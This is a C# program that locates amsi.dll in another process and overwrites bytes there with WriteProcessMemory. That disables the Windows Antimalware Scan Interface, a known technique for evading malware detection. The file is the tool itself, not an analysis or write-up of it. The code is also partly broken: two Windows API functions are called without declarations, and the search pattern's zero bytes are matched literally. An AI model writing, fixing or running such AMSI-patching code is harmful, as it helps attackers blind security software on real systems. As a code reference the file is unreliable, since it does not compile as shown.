using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct MEMORY_BASIC_INFORMATION
{
    public IntPtr BaseAddress;
    public IntPtr AllocationBase;
    public uint AllocationProtect;
    public IntPtr RegionSize;
    public uint State;
    public uint Protect;
    public uint Type;
}

class Program
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint dwSize, out uint lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint GetLastError();

    const uint PROCESS_VM_READ = 0x0010;
    const uint PROCESS_VM_WRITE = 0x0020;
    const uint PROCESS_VM_OPERATION = 0x0008;
    const uint PROCESS_QUERY_INFORMATION = 0x0400;

    // Patch bytes to replace the found pattern
    static byte[] patch = { 0x48, 0x31, 0xC0 }; // Example patch

    static void Main(string[] args)
    {
        int targetPid = 1234; // Replace with the actual PID
        byte[] pattern = { 0x48, 0x00, 0x00, 0x74, 0x00, 0x48, 0x00, 0x00, 0x74 };
        uint patternSize = (uint)pattern.Length;

        IntPtr processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, false, targetPid);
        if (processHandle == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open process. Error: {0}", Marshal.GetLastWin32Error());
            return;
        }

        // Get the base address of amsi.dll or the entire memory region
        IntPtr amsiBaseAddr = GetAmsiModuleBaseAddress(processHandle);
        if (amsiBaseAddr == IntPtr.Zero)
        {
            Console.WriteLine("Failed to find amsi.dll in the target process.");
            return;
        }

        // Read and patch the memory of amsi.dll or target memory
        ReadMemoryRegionAndPatch(processHandle, amsiBaseAddr, pattern, patternSize);
    }

    static void ReadMemoryRegionAndPatch(IntPtr processHandle, IntPtr moduleBase, byte[] pattern, uint patternSize)
    {
        MEMORY_BASIC_INFORMATION memInfo;
        uint mbiSize = (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION));

        // Get the memory information for the target module
        if (VirtualQueryEx(processHandle, moduleBase, out memInfo, mbiSize) == 0)
        {
            Console.WriteLine("Failed to query memory. Error: {0}", Marshal.GetLastWin32Error());
            return;
        }

        if (memInfo.State == 0x1000 /* MEM_COMMIT */ && (memInfo.Protect & 0xF0) != 0)
        {
            byte[] buffer = new byte[(int)memInfo.RegionSize];

            // Try to read the memory of the module
            if (ReadProcessMemory(processHandle, memInfo.BaseAddress, buffer, (uint)buffer.Length, out uint bytesRead))
            {
                Console.WriteLine("Reading memory at: 0x{0:X} - Size: {1}", memInfo.BaseAddress, memInfo.RegionSize);

                // Search for the pattern in the memory region
                ulong matchAddress = SearchPattern(buffer, bytesRead, pattern, patternSize);
                if (matchAddress != 0)
                {
                    Console.WriteLine("Pattern found at offset: 0x{0:X}", matchAddress);

                    // Calculate the address where the pattern was found
                    ulong updateAmsiAddress = (ulong)memInfo.BaseAddress.ToInt64() + matchAddress;

                    // Apply the patch
                    uint bytesWritten;
                    if (!WriteProcessMemory(processHandle, (IntPtr)updateAmsiAddress, patch, (uint)patch.Length, out bytesWritten))
                    {
                        Console.WriteLine("Failed to write process memory. Error: {0}", GetLastError());
                        return;
                    }

                    Console.WriteLine("Memory patched successfully.");
                }
                else
                {
                    Console.WriteLine("Pattern not found.");
                }
            }
            else
            {
                Console.WriteLine("Failed to read memory at: 0x{0:X}. Error: {1}", memInfo.BaseAddress, Marshal.GetLastWin32Error());
            }
        }
    }

    static ulong SearchPattern(byte[] buffer, uint bytesRead, byte[] pattern, uint patternSize)
    {
        for (int i = 0; i <= bytesRead - patternSize; i++)
        {
            bool found = true;
            for (int j = 0; j < patternSize; j++)
            {
                if (buffer[i + j] != pattern[j])
                {
                    found = false;
                    break;
                }
            }

            if (found)
                return (ulong)i; // Return the offset where the pattern was found
        }

        return 0; // Pattern not found
    }

    // Function to get the base address of amsi.dll or other modules
    private static IntPtr GetAmsiModuleBaseAddress(IntPtr processHandle)
    {
        IntPtr[] modules = new IntPtr[1024];
        uint cb = (uint)(IntPtr.Size * modules.Length);
        uint cbNeeded;

        if (EnumProcessModulesEx(processHandle, modules, cb, out cbNeeded, 0x03))
        {
            int moduleCount = (int)(cbNeeded / IntPtr.Size);

            for (int i = 0; i < moduleCount; i++)
            {
                char[] moduleNameBuffer = new char[255];
                GetModuleBaseName(processHandle, modules[i], moduleNameBuffer, (uint)moduleNameBuffer.Length);
                string moduleName = new string(moduleNameBuffer).TrimEnd('\0');

                if (moduleName.Equals("amsi.dll", StringComparison.OrdinalIgnoreCase))
                {
                    return modules[i]; // Return the base address of amsi.dll
                }
            }
        }

        return IntPtr.Zero; // amsi.dll not found
    }
}
